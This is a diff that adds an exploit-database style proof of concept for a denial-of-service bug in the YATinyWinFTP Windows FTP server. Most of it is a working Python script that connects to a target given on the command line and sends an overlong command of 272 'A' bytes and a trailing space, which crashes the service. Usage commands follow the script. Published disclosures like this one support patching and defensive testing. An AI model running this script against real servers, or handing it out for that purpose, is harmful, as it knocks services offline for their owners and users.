@@ -1,0 +1,35 @@
+# Exploit Title: YATinyWinFTP - Denial of Service (PoC)
+# Google Dork: None
+# Date: 20.08.2020
+# Exploit Author: strider
+# Vendor Homepage: https://github.com/ik80/YATinyWinFTP
+# Software Link: https://github.com/ik80/YATinyWinFTP
+# Tested on: Windows 10
+
+------------------------------[Description]---------------------------------
+
+This Eyxploit connects to the FTP-Service and sends a command which has a size of 256bytes with an trailing space at the end.
+The result it crashes
+
+ -----------------------------[Exploit]---------------------------------------------
+
+#!/usr/bin/env python3
+# -*- coding:utf-8 -*-
+
+import socket, sys
+
+target = (sys.argv[1], int(sys.argv[2]))
+buffer = b'A' * 272 + b'\x20'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+print(s.recv(1024))
+s.send(buffer)
+s.close()
+
+ -----------------------------[how to run]-----------------------------
+
+C:\> TinyWinFTP.exe servepath port
+
+~$ python3 exploit.py targetip port
+
+Boom!
